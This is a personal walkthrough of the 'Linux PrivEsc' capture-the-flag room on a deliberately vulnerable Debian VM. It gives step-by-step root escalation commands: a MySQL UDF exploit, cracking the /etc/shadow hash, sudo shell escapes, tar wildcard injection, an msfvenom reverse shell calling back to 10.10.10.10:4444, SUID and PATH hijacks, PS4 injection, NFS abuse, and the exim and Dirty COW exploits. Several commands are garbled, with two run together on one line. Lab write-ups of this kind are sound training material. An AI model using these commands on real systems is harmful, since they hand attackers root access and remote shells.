### **Linux PrivEsc**
![Linux PAM and Udisks LPE Vulnerabilities Allow Root Access on Major Distributions](https://github.com/user-attachments/assets/ea1a43bd-6299-4219-8b50-aae079109804)



Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321

let us deep dive into Linux privilege escalation today 

First lets connect to `ssh` server with passwd **`password321`** 

Run the "id" command. What is the result?

Answer:uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

Task 2:Service Exploits

The MySQL service is running as root and the "root" user for the service does not have a password assigned. 

in this we need to use  [popular exploit](https://www.exploit-db.com/exploits/1518) to access a UDFs to run system commands as root user ok lets do it the get into root user 

we have following commands to make so 

`cd /home/user/tools/mysql-udf`

Compile the raptor_udf2.c exploit code using the following commands:

- **`gcc`**: This is the GNU Compiler Collection, which is used to compile C and C++ programs.
- **`g`**: This option includes debugging information in the compiled output, which is useful for debugging with tools like gdb.
- **`c`**: This tells the compiler to compile the source file into an object file (`.o`) but not to link it into an executable.
- **`raptor_udf2.c`**: This is the source file being compiled.
- **`fPIC`**: This option generates position-independent code, which is necessary for creating shared libraries.

`gcc -g -c raptor_udf2.c -fPIC` 

`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

- **`gcc`**: Again, this is the compiler.
- **`g`**: Includes debugging information in the shared library.
- **`shared`**: This option tells the compiler to create a shared library.
- **`Wl,-soname,raptor_udf2.so`**: This passes options to the linker. The `soname` option specifies the shared object name, which is used by the dynamic linker to find the library.
- **`o raptor_udf2.so`**: This specifies the output file name for the shared library.
- **`raptor_udf2.o`**: This is the object file created from the first command, which is being linked into the shared library.
- **`lc`**: This links against the C standard library.

Connect to the MySQL service as the root user with a blank password:

`mysql -u root`

```bash
user@debian:~/tools/mysql-udf$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

we got into root user now 

we need to execute some commands on SQL database to exploit 

use mysql;

create table foo(line blob);

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

```bash
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.02 sec)

mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

```

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

```bash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.00 sec)

```

This Commands is used to copy and change permission of `/tmp/rootbash` 

Task 3:Weak File Permissions - Readable /etc/shadow

in this as we Know that passwords are stored in /etc/shadow file 

so task is to view and passwd and hashes of it

```bash
ls -l  /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```

to view contents & passwd of it commands is

```bash
cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
...
```

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

```bash
john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root) 
1g 0:00:00:39 DONE (2025-08-15 02:27) 0.02543g/s 1569p/s 1569c/s 1569C/s pussy6..neptune1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

<img width="1902" height="142" alt="IPE1" src="https://github.com/user-attachments/assets/dbf7ea04-708f-4a37-be4e-27422f3c73c8" />

got passwd `password123` & login in root.

What is the root user's password hash?

Answer:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::

What hashing algorithm was used to produce the root user's password hash?

Answer:sha512crypt

What is the root user's password?

password123

Task:4 Weak File Permissions - Writable /etc/shadow

In this need,

Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

`su root` 

<img width="1911" height="296" alt="LPE2" src="https://github.com/user-attachments/assets/7eb71746-73ca-4d08-a77c-4d4f6d983382" />


Run the "id" command as the newroot user. What is the result?

Answer:`uid=0(root) gid=0(root) groups=0(root)`

Task 6: Sudo - Shell Escape Sequences

List the programs which sudo allows your user to run:

`sudo -l`

I used this to access into shell If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- `sudo sudo /bin/sh`
- `sudo vim -c ':!/bin/sh`

<img width="316" height="130" alt="LPE3" src="https://github.com/user-attachments/assets/c0ffe354-cc21-4639-9cb7-9918eb5b9e12" />


How many programs is "user" allowed to run via sudo? 

Answer:11

One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

Answer:apache2

**Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.**

We could try out the options that the application provides and see if any of them can be exploited. We can also check if there are any known exploits for the service and use them to gain root privileges.

To gain root privileges without a shell escape sequence, you can explore the options available for the program you are allowed to run with sudo. For example, check the manual page of the program to find any options that allow you to execute or process files, which could potentially lead to privilege escalation. [narycyber.com](https://www.narycyber.com/posts/privilege-escalation/linux/sudo-exploitation/) [tw00t.github.io](https://tw00t.github.io/posts/linuxprivesc-tryhackme/)

[](https://external-content.duckduckgo.com/ip3/www.narycyber.com.ico)

[](https://external-content.duckduckgo.com/ip3/tw00t.github.io.ico)

## **Gaining Root Privileges Without Shell Escape Sequences**

### **Understanding the Context**

When using `sudo`, certain programs may not have shell escape sequences available. However, you can still exploit the functionality of these programs to gain root privileges.

### **Steps to Exploit a Program**

1. **Identify the Program**: Use the command `sudo -l` to list the programs you can run with `sudo`.
2. **Check Program Options**: Investigate the options available for the program. For example, if the program is `apache2`, you can check its manual by running `man /usr/sbin/apache2`.
3. **Use Program Functionality**: Look for options that allow you to execute or process files. For instance, you might find an option that lets you specify a configuration file or a script.
4. **Execute a Command**: You can try running the program with a command that performs an action you control. For example, if you can run `sudo /usr/sbin/apache2 -f /etc/passwd`, this might return an error message but could also provide insights into how the program processes files.

### **Example Scenario**

If you have access to `apache2` via `sudo`, you might run:

```bash
bashCopy Code
sudo /usr/sbin/apache2 -f /etc/passwd

```

This command attempts to load the `/etc/passwd` file, which could reveal information about the system or lead to further exploitation opportunities.

### **Conclusion**

By carefully analyzing the program's options and functionality, you can find ways to leverage `sudo` to gain root access, even without direct shell escape sequences. Always ensure to exit any elevated sessions and clean up any files created during the process.

Task 7:**Sudo - Environment Variables**

In this we just need to add payload in C to path of apache and look into which type of programs have environment variable and just into path.

Task 8:Cron Jobs - File Permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

`cat /etc/crontab`

```bash
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```
<img width="1875" height="220" alt="LPE5" src="https://github.com/user-attachments/assets/920f0508-f657-43f1-a3fc-817c87b628d6" />


i did to find full path of this file


now I need setup a reverse shell in that file 

Task 9 : Cron jobs -PATH Environment Variable

i first need to view to contents of crontab 
<img width="1896" height="616" alt="LPE6" src="https://github.com/user-attachments/assets/d95fc095-0286-4679-b9c2-4e8496625de5" />


 PATH variable starts with **/home/user** which is our user's home directory
let create file [overwrite.sh](http://overwrite.sh) in `/home/user` 

<img width="1916" height="894" alt="LPE7" src="https://github.com/user-attachments/assets/ad9b49ac-1596-42f0-858c-4d2c433eb6f2" />


because of low PATH Environment Variable we can easily execute command for user and get into root user

<img width="1557" height="237" alt="LPE8" src="https://github.com/user-attachments/assets/7b62e88a-7e0f-44a5-a860-5e3e7f24937f" />


What is the value of the PATH variable in /etc/crontab?

Answer:/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

Task 10:Cron Jobs - Wildcards

Let view other scripts there in it

`cat /usr/local/bin/compress.sh`

the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

command:
`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

<img width="1586" height="321" alt="LPE9" src="https://github.com/user-attachments/assets/611157dc-1f81-4699-b336-0d448c4f0e78" />
<img width="1897" height="190" alt="LPE10" src="https://github.com/user-attachments/assets/92cd93de-c0ad-43c3-8464-b62d5a15777e" />


Transfer the shell.elf file to **/home/user/** on the Debian VM (you can use **scp** or host the file on a webserver on your Kali box and use **wget**). Make sure the file is executable:

`chmod +x /home/user/shell.elf`

Create these two files in /home/user:

`touch /home/user/--checkpoint=1touch /home/user/--checkpoint-action=exec=shell.elf`

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

`nc -nvlp 4444`

we are be connected to root user.

Task 11 : SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
more...
```

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at **/home/user/tools/suid/exim/cve-2016-1531.sh**.

<img width="1919" height="769" alt="LPE11" src="https://github.com/user-attachments/assets/f4583ef6-4ac4-488d-b0d0-2516674ea05a" />


this exploit is present in Debian VM.

Run the exploit script to gain a root shell:

`/home/user/tools/suid/exim/cve-2016-1531.sh`

```bash
user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
[ CVE-2016-1531 local root exploit
sh-4.1# whoami
root
sh-4.1# 

```

Task 12 SUID / SGID Executables - Shared Object Injection:

In task we have **`/usr/local/bin/suid-so`**SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

`/usr/local/bin/suid-so`

```bash
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
user@debian:~$ 

```

Run **strace** on the file and search the output for open/access calls and for "no such file" errors:

what does `starce` means?

`strace` is a diagnostic, debugging, and instructional userspace utility for Linux. It is used to monitor and tamper with interactions between processes and the Linux kernel, specifically by tracing system calls and signals. 

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
<img width="1902" height="597" alt="LPE12" src="https://github.com/user-attachments/assets/102c3056-35b1-4e42-9f91-f639f9f8c33e" />



Note that the executable tries to load the **`/home/user/.config/libcalc.so`** shared object within our home directory, but it cannot be found.

Create the **.config** directory for the libcalc.so file:

`mkdir /home/user/.config`

I found a shared object at path **`/home/user/tools/suid/libcalc.c`**. It simply spawns a Bash shell. Compile the code into a shared object at the location the **suid-so** executable was looking for it:


<img width="1044" height="400" alt="LPE13" src="https://github.com/user-attachments/assets/395edeeb-68af-48f9-901c-7356e4ba705a" />

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.

`/usr/local/bin/suid-so`
<img width="1884" height="189" alt="LPE14" src="https://github.com/user-attachments/assets/b18f03c6-fef6-4beb-9802-7cc559c524c6" />


yes We got it…

Task 13 SUID / SGID Executables - Environment Variables

The **`/usr/local/bin/suid-env`** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

`/usr/local/bin/suid-env`

this has binary data so, 
<img width="1751" height="165" alt="LPE15" src="https://github.com/user-attachments/assets/e3b7c5a8-8e2d-4242-ad00-fdafa71b6336" />


Run strings on the file to look for strings of printable characters:

`strings /usr/local/bin/suid-env`

```bash
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

One line ("service apache2 start") suggests that the **service** executable is being called to start the webserver, however the full path of the executable `/usr/sbin/service` is not being used.

<img width="1552" height="316" alt="LPE16" src="https://github.com/user-attachments/assets/b981e32e-e26b-4aea-8223-e725b0097ec5" />

Compile the code located at **`/home/user/tools/suid/service.c`** into an executable called **service**. This code simply spawns a Bash shell:

`gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`

<img width="1696" height="184" alt="LPE17" src="https://github.com/user-attachments/assets/634f8ff5-8ad1-4c92-9c1f-306901936956" />

We got it…

Task 14 SUID / SGID Executables - Abusing Shell Features (#1)

The `/usr/local/bin/suid-env2` executable is identical to **`/usr/local/bin/suid-env`** except that it uses the absolute path of the service executable (`/usr/sbin/service`) to start the apache2 webserver.

in this we have some binary text in file by using string command we will read it.
<img width="1891" height="761" alt="LPE18" src="https://github.com/user-attachments/assets/5c9f9d97-337e-4da5-a110-68e65e0bb80a" />


Verify this with strings:

`strings /usr/local/bin/suid-env2`

```bash
/lib64/ld-linux-x86-64.so.2
~~__gmon_start__
libc.so.6
setresgid
setresuid
system~~
~~__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H~~
/usr/sbin/service apache2 start

```

we have something called apache2 service to start command here 

lets Verify the version of Bash installed on the Debian VM is less than 4.2-048:

`/bin/bash --version`

we got `version 4.1.5(1)-release (x86_64-pc-linux-gnu)`

Create a Bash function with the name "**/usr/sbin/service**" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

`function /usr/sbin/service { /bin/bash -p; }export -f /usr/sbin/service`

Run the **suid-env2** executable to gain a root shell:

`/usr/local/bin/suid-env2`
<img width="1676" height="279" alt="LPE19" src="https://github.com/user-attachments/assets/29fe5783-72bd-41ed-af0f-2bd8fd48d147" />


Task 15 SUID / SGID Executables - Abusing Shell Features (#2)

In this Debian VM bash has version 4.4 and above only,

to debugging node this we need to use environment variable `PS4` to display an extra prompt

Run the **`/usr/local/bin/suid-env2`** executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

this is same like task 6  
<img width="1919" height="462" alt="LPE20" src="https://github.com/user-attachments/assets/e4f4c017-09b1-421f-9b85-20f6d76cd59e" />


Task 16 Passwords & Keys - History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file. this what interesting of CLI 

we can command `cat ~/.*history | less` to see it.

 

<img width="1249" height="480" alt="LPE21" src="https://github.com/user-attachments/assets/af9fe2a0-eb59-4835-8041-b8566f4d339e" />

What is the full mysql command the user executed?

Answer: mysql -h somehost.local -uroot -ppassword123

Task 17: Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats. this also might be some interesting stuff in that files.

`ls /home/user`

`cat "anyfile/to/open/in/directory`
<img width="617" height="277" alt="LPE22" src="https://github.com/user-attachments/assets/57d6ee9c-4ba6-43d2-ac55-9bde8f0fec93" />



The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

`su root`

What file did you find the root user's credentials in?   

Answer:/etc/openvpn/auth.txt

Task 18:Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

lets look into find hidden stuff here.

`ls -ls /`

and we have world file called root_key 

Task 19:NFS

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
ok then check out here than 

`cat /etc/exports`

```bash
user@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
more

```

switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the **/tmp** share:

`mkdir /tmp/nfsmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`

Still using Kali's root user, generate a payload using **msfvenom** and save it to the mounted share (this payload simply calls /bin/bash):

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
<img width="1797" height="356" alt="LPE23" src="https://github.com/user-attachments/assets/db55c7ad-7815-44de-a982-a359df95460f" />


Still using Kali's root user, make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`

What is the name of the option that disables root squashing?

Answer:no_root_squash

Task 20:Kernel Exploits
<img width="1917" height="648" alt="LPE24" src="https://github.com/user-attachments/assets/d7dac96d-2cc9-4005-b84e-5a24a9e3841e" />


we havw automated tools to do what we did tell now like 

`linPEAS.SH, lse.sh,linEnum.sh` 

for exploits of kernels we have `dirtycow , linux-exploit-suggester-2`   

now lets use of them to see what happens

`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

```bash
root@debian:/home/user/tools/kernel-exploits# perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [5] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [6] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [8] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [9] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [10] ptrace_kmod2
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
      Source: http://www.exploit-db.com/exploits/15023
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024

root@debian:/home/user/tools/kernel-exploits# 

```

Exploit code for Dirty COW can be found at **`/home/user/tools/kernel-exploits/dirtycow/c0w.c`**. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of `/usr/bin/passwd` is made at `/tmp/bak`.

Compile the code and run it (note that it may take several minutes to complete):

`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w./c0w`
<img width="1700" height="578" alt="LPE25" src="https://github.com/user-attachments/assets/5a0daba2-cc76-4f6c-8084-e8a693b07639" />


Once the exploit completes, run /usr/bin/passwd to gain a root shell:

`/usr/bin/passwd`

Several tools have been written which help find potential privilege escalations on Linux

We have successfully completed our room and learned many valuable lessons. I believe we should consider using automated tools for Linux privilege escalation instead of relying solely on manual methods that involve exposing the machine.

I’d love to hear your thoughts in the comments!

Thank you for reading!
